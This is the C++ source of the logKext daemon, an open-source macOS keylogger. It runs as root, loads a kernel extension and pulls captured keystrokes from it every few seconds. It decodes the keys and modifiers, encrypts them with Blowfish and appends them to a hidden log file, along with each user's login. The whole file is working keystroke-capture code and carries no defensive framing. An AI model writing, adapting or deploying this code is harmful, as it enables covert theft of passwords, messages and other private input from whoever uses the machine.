/*
	logKextDaemon.cpp
	logKext

   Copyright 2007 Braden Thomas

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

#include <unistd.h>
#include <sys/mount.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <openssl/rand.h>
#include <syslog.h>

#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include "logKextDaemon.h"
#include "logKextCommon.h"

#define TIME_TO_SLEEP		2
#define PATHNAME_PREF_KEY	CFSTR("Pathname")
#define ENCRYPT_PREF_KEY	CFSTR("Encrypt")
#define PASSWORD_PREF_KEY	CFSTR("Password")
#define MINMEG_PREF_KEY		CFSTR("MinMeg")
#define SYSTEM_KEYCHAIN		"/Library/Keychains/System.keychain"
#define SECRET_SERVICENAME	"logKextPassKey"

/**********Function Declarations*************/

void		write_buffer(CFStringRef);
int			load_kext();
bool		outOfSpace(CFStringRef);
void		stamp_file(CFStringRef);
bool		fileExists(CFStringRef);
void		makeEncryptKey(CFStringRef pass);

void		updateEncryption();
void		updateKeymap();

void		getBufferSizeAndKeys(int *size,int *keys);
CFStringRef	getBuffer();
bool		connectToKext();

void		DaemonTimerCallback( CFRunLoopTimerRef timer, void *info );
int			InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned);
void		LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info);

/****** Globals ********/
io_connect_t		userClient;
CFWriteStreamRef	logStream;
CFMutableDataRef	encrypt_buffer;		// 8 bytes
CFDictionaryRef		keymap;

CFBooleanRef		doEncrypt;
BF_KEY				encrypt_bf_key;
CFBooleanRef		showMods;
CFStringRef			pathName;

/****** Main ********/

int main()
{
	if (geteuid())
	{
		syslog(LOG_ERR,"Error: Daemon must run as root.");
		exit(geteuid());
	}

	encrypt_buffer = CFDataCreateMutable(kCFAllocatorDefault,8);
	
/*********Set up File**********/

	if (!(pathName = (CFStringRef)CFPreferencesCopyAppValue(PATHNAME_PREF_KEY,PREF_DOMAIN)))
	{
		pathName = CFSTR(DEFAULT_PATHNAME);
		CFPreferencesSetAppValue(PATHNAME_PREF_KEY,pathName,PREF_DOMAIN);
	}

	CFURLRef logPathURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false);	
	logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,logPathURL);
	CFRelease(logPathURL);

	if (!logStream)
	{
		syslog(LOG_ERR,"Error: Couldn't open file stream at start.");	
		return 1;
	}

/*********Check encryption & keymap**********/

	updateEncryption();
	updateKeymap();

/*********Check space**********/

	if (outOfSpace(pathName))
	{
		stamp_file(CFSTR("Not enough disk space remaining!"));
		CFRunLoopStop(CFRunLoopGetCurrent());
	}

/*********Connect to kernel extension**********/
	
	if (!connectToKext())
	{
		if (load_kext())
		{
			stamp_file(CFSTR("Could not load KEXT"));
			return 1;
		}
		if (!connectToKext())
		{
			stamp_file(CFSTR("Could not connect with KEXT"));
			return 1;
		}
	}
	sleep(1);		// just a little time to let the kernel notification handlers finish
	
	stamp_file(CFSTR("LogKext Daemon starting up"));
	// stamp login file with initial user
	LoginLogoutCallBackFunction(NULL, NULL, NULL);
	
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	
/*********Create Daemon Timer source**********/

	CFRunLoopTimerContext timerContext = { 0 };
	CFRunLoopSourceRef loginLogoutSource;	
    if (InstallLoginLogoutNotifiers(&loginLogoutSource))
		syslog(LOG_ERR,"Error: could not install login notifier");
	else
		CFRunLoopAddSource(CFRunLoopGetCurrent(),loginLogoutSource, kCFRunLoopDefaultMode);

	CFRunLoopTimerRef daemonTimer = CFRunLoopTimerCreate(NULL, 0, TIME_TO_SLEEP, 0, 0, DaemonTimerCallback, &timerContext);
	CFRunLoopAddTimer(CFRunLoopGetCurrent(), daemonTimer, kCFRunLoopCommonModes);

	
	CFRunLoopRun();
	
	stamp_file(CFSTR("Server error: closing Daemon"));	
	CFWriteStreamClose(logStream);
}


void DaemonTimerCallback( CFRunLoopTimerRef timer, void *info )
{
/*********Wait if not logging**********/

	Boolean validKey;
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		isLogging = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
	}
	
	if (!CFBooleanGetValue(isLogging))
		return;
	
/********* Check the buffer **********/

	int buffsize=0;
	int keys=0;
	getBufferSizeAndKeys(&buffsize,&keys);

	#ifdef LK_DEBUG
		syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);	
	#endif

	if (!keys)			// no keyboards logged
		return;

	if (buffsize < MAX_BUFF_SIZE/10)
		return;

/********* Get the buffer **********/

	CFStringRef the_buffer = getBuffer();
	
/********* Check defaults/file **********/		

	CFStringRef curPathName = (CFStringRef)CFPreferencesCopyAppValue(PATHNAME_PREF_KEY,PREF_DOMAIN);
	if (!curPathName)		// path has been deleted
	{
		pathName = CFSTR(DEFAULT_PATHNAME);
		CFPreferencesSetAppValue(PATHNAME_PREF_KEY,pathName,PREF_DOMAIN);

		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));

		if (!logStream)
		{
			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
			return;
		}
	}
	else if (CFStringCompare(curPathName,pathName,0)!=kCFCompareEqualTo)	// path has changed
	{
		pathName = curPathName;			
		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));

		if (!logStream)
		{
			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
			return;
		}
		
		CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,CFDataGetLength(encrypt_buffer)));
	}

	if (!fileExists(pathName))		// when file is deleted, we resync the encryption & keymap preferences
	{
		CFPreferencesAppSynchronize(PREF_DOMAIN);
		updateEncryption();
		updateKeymap();

		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
		if (!logStream)
		{
			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
			return;
		}

		stamp_file(CFSTR("LogKext Daemon created new logfile"));
	}

	if (outOfSpace(pathName))
	{
		stamp_file(CFSTR("Not enough disk space remaining!"));
		return;
	}

/********* Finally, write the buffer **********/

	write_buffer(the_buffer);
	CFRelease(the_buffer);		
	
	return;
}

int load_kext()
{
    int		childStatus=0;
    pid_t	pid;

    if (!(pid = fork()))
	{
		execl("/sbin/kextload", "/sbin/kextload", "-b", KEXT_ID, NULL);
		_exit(0);
	}
	waitpid(pid, &childStatus, 0);
	return childStatus;
}

void updateKeymap()
{
	CFReadStreamRef	readStream;

	if (!fileExists(CFSTR(KEYMAP_PATH)))
	{
		stamp_file(CFSTR("Error: Keymap file is missing"));
		keymap = NULL;
		return;
	}
	
	readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
	if (!readStream||!(CFReadStreamOpen(readStream)))
	{
		stamp_file(CFSTR("Error: Can't open keymap file"));
		keymap = NULL;
		return;
	}
	keymap = (CFDictionaryRef)CFPropertyListCreateFromStream(kCFAllocatorDefault,readStream,0,kCFPropertyListImmutable,NULL,NULL);
	CFReadStreamClose(readStream);
	if (!keymap)
	{
		stamp_file(CFSTR("Error: Can't read keymap file"));
		return;
	}
	
	Boolean validKey;
	showMods = (CFPreferencesGetAppBooleanValue(CFSTR("Mods"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		showMods = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Mods"),showMods,PREF_DOMAIN);
	}
}

void updateEncryption()
{
	Boolean			validKey;
	CFStringRef		password;
	unsigned char	md5[16];
	char			hash[32];
	
	doEncrypt = (CFPreferencesGetAppBooleanValue(ENCRYPT_PREF_KEY,PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		doEncrypt = kCFBooleanTrue;
		CFPreferencesSetAppValue(ENCRYPT_PREF_KEY,doEncrypt,PREF_DOMAIN);
	}
	
	if (!(password = (CFStringRef)CFPreferencesCopyAppValue(PASSWORD_PREF_KEY,PREF_DOMAIN)))
	{
		password = CFSTR(DEFAULT_PASSWORD);		
		MD5((const unsigned char*)CFStringGetCStringPtr(password,CFStringGetFastestEncoding(password)),CFStringGetLength(password),md5);
		for (int i=0; i<sizeof(md5); i++) 
			sprintf(hash+2*i,"%02x",md5[i]);
		password = CFStringCreateWithCString(kCFAllocatorDefault,hash,kCFStringEncodingASCII);
		
		CFPreferencesSetAppValue(PASSWORD_PREF_KEY,password,PREF_DOMAIN);
	}
	makeEncryptKey(password);
}

void makeEncryptKey(CFStringRef pass)
{
	UInt32				passLen;
	unsigned char		*passData;

	SecKeychainItemRef	itemRef=NULL;
	SecKeychainRef		sysChain;
	OSStatus			secRes;
	
	BF_KEY				temp_key;
	unsigned char		encrypt_key[8];	
	
	if ((secRes = SecKeychainOpen(SYSTEM_KEYCHAIN, &sysChain)) != 0)
	{
		syslog(LOG_ERR,"Couldn't get system keychain: %d\n",secRes);
		exit(-1);
	}

	if ((secRes = SecKeychainFindGenericPassword(sysChain, strlen(SECRET_SERVICENAME), SECRET_SERVICENAME, 0, NULL, &passLen, (void**)&passData, &itemRef))!=0)
	{
		syslog(LOG_ERR,"Error finding secret in keychain (%d). Failing",secRes);
		exit(-1);
	}
	
	BF_set_key(&temp_key,passLen,passData);
	BF_ecb_encrypt((const unsigned char*)CFStringGetCStringPtr(pass,CFStringGetFastestEncoding(pass)),encrypt_key,&temp_key,BF_ENCRYPT);
	BF_set_key(&encrypt_bf_key,8,encrypt_key);	
	return;
}

bool fileExists(CFStringRef pathName)
{
	struct stat fileStat;
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		return false;
	return true;
}

bool outOfSpace(CFStringRef pathName)
{
	Boolean			validKey;
	unsigned int	minMeg;
	struct statfs	fileSys;
	
	minMeg = CFPreferencesGetAppIntegerValue(MINMEG_PREF_KEY,PREF_DOMAIN,&validKey);
	if (!validKey)
	{
		minMeg = DEFAULT_MEG;
		CFPreferencesSetAppValue(MINMEG_PREF_KEY,CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&minMeg),PREF_DOMAIN);
	}

	if (statfs(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileSys))
		return false;

	if ((fileSys.f_bsize/1024)*(fileSys.f_bavail/1024) < minMeg)
		return true;
		
	return false;
}

void stamp_file(CFStringRef inStamp)
{
	time_t the_time;
	char timeBuf[32]={0};
	time(&the_time);
	ctime_r(&the_time, timeBuf);
	char* newlin=strchr(timeBuf, '\n');
	if (newlin)
		*newlin=0;
	CFStringRef stamp = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("\n![%@ : %s]\n"),inStamp,timeBuf);
	write_buffer(stamp);
}

void write_buffer(CFStringRef inData)
{
	#ifdef LK_DEBUG
		syslog(LOG_ERR,"Writing buffer to file.");
	#endif

	if (CFWriteStreamGetStatus(logStream)!=kCFStreamStatusOpen)
	{
		CFWriteStreamSetProperty(logStream,kCFStreamPropertyAppendToFile,kCFBooleanTrue);
		CFWriteStreamOpen(logStream);
	}

	if (!CFBooleanGetValue(doEncrypt))
	{
		CFWriteStreamWrite(logStream,(const UInt8*)CFStringGetCStringPtr(inData,CFStringGetFastestEncoding(inData)),CFStringGetLength(inData));
		return;
	}

	int buff_pos = 0;
	while (1)
	{	
		int avail_space =	8-CFDataGetLength(encrypt_buffer);					//space rem in buffer
		int rem_to_copy =	CFStringGetLength(inData)-buff_pos;					//stuff in data that needs to be copied
		int to_copy =		rem_to_copy<avail_space?rem_to_copy:avail_space;	//amount left to encryp, or avail space
		
		if (avail_space)
		{	
			UInt8 tmp_buff[8];
			CFStringGetBytes(inData,CFRangeMake(buff_pos,to_copy),kCFStringEncodingNonLossyASCII,0,false,tmp_buff,8,NULL);
			CFDataAppendBytes(encrypt_buffer,tmp_buff,to_copy);
			
			avail_space -= to_copy;
			if (avail_space>0)			// small buffer? still space left?
				break;
			buff_pos += to_copy;			//move along the buffer
		}
		
		UInt8 enc_buff[8];
		BF_ecb_encrypt(CFDataGetBytePtr(encrypt_buffer),enc_buff,&encrypt_bf_key,BF_ENCRYPT);
		CFWriteStreamWrite(logStream,enc_buff,8);

		CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,8));
		
		if (buff_pos==CFStringGetLength(inData))				//just in case buffer happens to fit perfectly
			break;
	}
	
	return;

}

bool connectToKext()
{
    mach_port_t		masterPort;
    io_service_t	serviceObject = 0;
    io_iterator_t 	iterator;
    CFDictionaryRef	classToMatch;
	Boolean			result = true;	// assume success
    
    // return the mach port used to initiate communication with IOKit
    if (IOMasterPort(MACH_PORT_NULL, &masterPort) != KERN_SUCCESS)
		return false;
    
    classToMatch = IOServiceMatching( "com_fsb_iokit_logKext" );
    if (!classToMatch)
		return false;

    // create an io_iterator_t of all instances of our driver's class that exist in the IORegistry
    if (IOServiceGetMatchingServices(masterPort, classToMatch, &iterator) != KERN_SUCCESS)
		return false;
			    
    // get the first item in the iterator.
    serviceObject = IOIteratorNext(iterator);
    
    // release the io_iterator_t now that we're done with it.
    IOObjectRelease(iterator);
    
    if (!serviceObject){
		result = false;
		goto bail;
    }
	
	// instantiate the user client
	if(IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient) != KERN_SUCCESS) {
		result = false;
		goto bail;
    }
	
bail:
	if (serviceObject) {
		IOObjectRelease(serviceObject);
	}
	
    return result;
}

void getBufferSizeAndKeys(int* size, int* keys)
{
	kern_return_t kernResult;
	
	uint64_t	scalarO_64[2];
	uint32_t	outputCnt = 2;

	kernResult = IOConnectCallScalarMethod(userClient, // mach port
										   klogKextBuffandKeys,
										   NULL,
										   0,
										   scalarO_64,
										   &outputCnt);
	
	*size=scalarO_64[0];
	*keys=scalarO_64[1];
	return;
}

CFStringRef getBuffer()
{
	kern_return_t kernResult;
	bufferStruct myBufStruct;
	size_t structSize = sizeof(myBufStruct);
	
	kernResult = IOConnectCallMethod(userClient,
									 klogKextBuffer,
									 NULL,
									 0,
									 NULL,
									 NULL,
									 NULL,
									 NULL,
									 &myBufStruct,
									 &structSize);
	
	CFDataRef result = CFDataCreate(kCFAllocatorDefault,myBufStruct.buffer,myBufStruct.bufLen);
	CFMutableStringRef decodedData = CFStringCreateMutable(kCFAllocatorDefault,0);
	
	if (!keymap)
		return decodedData;
	
	CFDictionaryRef flagsDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Flags"));
	if (!flagsDict)
		return decodedData;
	CFDictionaryRef ucDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Uppercase"));
	if (!ucDict)
		return decodedData;
	CFDictionaryRef lcDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Lowercase"));
	if (!lcDict)
		return decodedData;

	CFNumberFormatterRef myNF = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
	
	for (int i=0; i<CFDataGetLength(result);i+=2)
	{
		u_int16_t curChar;
		CFDataGetBytes(result,CFRangeMake(i,2),(UInt8*)&curChar);
		bool isUpper = false;
		
		if (CFBooleanGetValue(showMods))
		{
			char flagTmp = (curChar >> 11);
			
			if (flagTmp & 0x01)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x01")));

			if (flagTmp & 0x02)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x02")));

			if (flagTmp & 0x04)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x04")));

			if (flagTmp & 0x08)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x08")));
				
			if (flagTmp & 0x10)
				isUpper = true;
		}

		curChar &= 0x07ff;		
		CFStringRef keyChar = CFNumberFormatterCreateStringWithValue(kCFAllocatorDefault,myNF,kCFNumberShortType,&curChar);
		CFStringRef text;

		if (isUpper)
			text = (CFStringRef)CFDictionaryGetValue(ucDict,keyChar);
		else
			text = (CFStringRef)CFDictionaryGetValue(lcDict,keyChar);		
		
		if (text)
		{
			if (CFStringCompare(text,CFSTR("\\n"),0)==kCFCompareEqualTo)
				text = CFSTR("\n");

			CFStringAppend(decodedData,text);
		}
		else
			syslog(LOG_ERR,"Unmapped key %d",curChar);		
	}

	return decodedData;
}



void LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info)
{
    CFStringRef	consoleUserName;
    consoleUserName = SCDynamicStoreCopyConsoleUser(store, NULL, NULL);
    if (consoleUserName != NULL)
    {
		stamp_file(CFStringCreateWithFormat(NULL, NULL, CFSTR("User '%@' has logged in"), consoleUserName));
        CFRelease(consoleUserName);
    }
}

int InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned)
{
    SCDynamicStoreContext DynamicStoreContext = { 0, NULL, NULL, NULL, NULL };
    SCDynamicStoreRef DynamicStoreCommunicationMechanism = NULL;
    CFStringRef KeyRepresentingConsoleUserNameChange = NULL;
    CFMutableArrayRef ArrayOfNotificationKeys;
    Boolean Result;

    *RunloopSourceReturned = NULL;
    DynamicStoreCommunicationMechanism = SCDynamicStoreCreate(NULL, CFSTR("logKext"), LoginLogoutCallBackFunction, &DynamicStoreContext);

    if (DynamicStoreCommunicationMechanism == NULL)
        return(-1); //unable to create dynamic store.

    KeyRepresentingConsoleUserNameChange = SCDynamicStoreKeyCreateConsoleUser(NULL);
    if (KeyRepresentingConsoleUserNameChange == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-2);
    }

    ArrayOfNotificationKeys = CFArrayCreateMutable(NULL, (CFIndex)1, &kCFTypeArrayCallBacks);
    if (ArrayOfNotificationKeys == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        CFRelease(KeyRepresentingConsoleUserNameChange);
        return(-3);
    }
    CFArrayAppendValue(ArrayOfNotificationKeys, KeyRepresentingConsoleUserNameChange);

     Result = SCDynamicStoreSetNotificationKeys(DynamicStoreCommunicationMechanism, ArrayOfNotificationKeys, NULL);
     CFRelease(ArrayOfNotificationKeys);
     CFRelease(KeyRepresentingConsoleUserNameChange);

     if (Result == FALSE) //unable to add keys to dynamic store.
     {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-4);
     }

	*RunloopSourceReturned = SCDynamicStoreCreateRunLoopSource(NULL, DynamicStoreCommunicationMechanism, (CFIndex) 0);
    return(0);
}